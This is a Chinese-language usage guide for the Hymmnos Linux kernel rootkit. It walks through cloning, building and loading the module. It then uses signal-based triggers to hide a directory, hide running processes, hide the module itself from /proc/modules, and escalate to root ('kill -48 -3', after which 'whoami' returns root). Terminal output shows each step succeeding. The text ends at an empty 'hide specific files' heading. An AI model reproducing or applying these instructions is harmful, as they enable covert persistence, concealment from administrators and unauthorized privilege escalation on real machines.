## 使用文档

### **构建**



1. 克隆源代码

   ```bash
   $ cd ~
   $ git clone https://github.com/flysoar/Hymmnos-rootkit.git
   ```



2. 从源码构建

   ```bash
   $ cd Hymmnos-rootkit
   $ make
   ```


3. 加载入内核

   ```bash
   $ sudo insmod hymmnos.ko
   ```



### **使用**

- 隐藏文件夹自身 —— 将源代码文件夹改名为 *hymmnos*。

  ```bash
  $ cd ..
  $ mv Hymmnos-rootkit/ hymmnos/
  ```

![hide_document_after](https://github.com/udidi/Hymmnos-rootkit/blob/master/screenshot/hide_document_after.png)

![hide_document_before](https://github.com/udidi/Hymmnos-rootkit/blob/master/screenshot/hide_document_before.png)



- 隐藏特定进程

  1. 未隐藏进程之前

     ```bash
     $ ps aux | grep hymmnos
     ```

     返回

     ```bash
     henry     3436  0.0  0.0  21536  1028 pts/0    S+   13:20   0:00 grep --color=auto hymmnos
     ```

  2. 隐藏进程（kill -49 命令）

     ```bash
     $ top
     $ ps aux | grep top
     henry     1593  0.0  1.4 813092 57416 tty2     Sl+  11:33   0:01 nautilus-desktop
     henry     3496  1.3  0.0  48940  3772 pts/0    S+   13:32   0:00 top
     henry     3518  0.0  0.0  21536  1136 pts/1    S+   13:33   0:00 grep --color=auto top
     $ kill -49 3496
     $ ps aux | grep top
     henry     1593  0.0  1.4 813092 57416 tty2     Sl+  11:33   0:01 nautilus-desktop
     henry     3520  0.0  0.0  21536  1064 pts/1    S+   13:33   0:00 grep --color=auto top
     ```

  3. 恢复进程（卸载模块）

     ``` bash
     $ sudo rmmod hymmnos
     $ ps aux | grep top
     henry     1593  0.0  1.4 813092 57416 tty2     Sl+  11:33   0:01 nautilus-desktop
     henry     3496  1.3  0.0  48940  3772 pts/0    S+   13:32   0:05 top
     henry     3581  0.0  0.0  21536  1008 pts/1    S+   13:39   0:00 grep --color=auto top
     ```

- 隐藏模块

- 1. 隐藏 *hymmnos* 模块（kill -50 7 命令）

     ```bash
     $ cat /proc/modules | grep hymmnos
     hymmnos 24576 0 - Live 0x0000000000000000 (OE)
     $ kill -50 7
     $ cat /proc/modules | grep hymmnos
     ```


  2. 恢复 *hymmnos* 模块（kill -50 7 命令）

     ```bash
     $ kill -50 7
     $ cat /proc/modules | grep hymmnos
     hymmnos 24576 0 - Live 0x0000000000000000 (OE)
     ```


- 获取 root 权限（kill -48

  ```bash
  $ kill -48 -3
  $ whoami
  root
  ```


- 隐藏特定文件
